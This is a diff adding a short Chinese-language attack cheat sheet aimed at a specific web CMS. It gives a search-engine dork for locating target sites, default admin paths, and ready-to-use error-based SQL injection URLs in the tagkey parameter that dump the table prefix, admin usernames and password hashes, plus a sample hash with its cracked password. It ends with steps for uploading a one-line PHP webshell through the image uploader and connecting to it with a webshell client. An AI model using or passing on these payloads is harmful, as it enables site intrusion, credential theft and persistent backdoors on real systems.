@@ -1,0 +1,23 @@
+ 
+百度关键字:inurl:index.php?ac=article&at=read&did============================================================================================================
+默认后台:adminsoft/index.php   OR    admin
+===========================================================================================================
+爆表前缀:index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+
+ 
+===========================================================================================================
+爆用户：index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,username,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+===========================================================================================================
+爆密码：index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,password,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+===========================================================================================================
+密码和用户一次性爆：index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,username,0x27,password)) from royal_admin_member limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+                         用户名：admin   密码： 64039aa42fa57087e880a77a10f10298     （最后面的1数字不是 ，只截止到前32位,破解得 admin_tmtmw）
+
+ 
+===========================================================================================================
+拿shell:
+进到后台后，直接点击分类图片===修改==选择文件===直接上传一句话木马
+然后用菜刀连接………………………………
+PS：当上传不了php网马时，去系统设置一下，添加图片上传格式 |php 。这样就可以上传一个图片文件头的网马
+
+
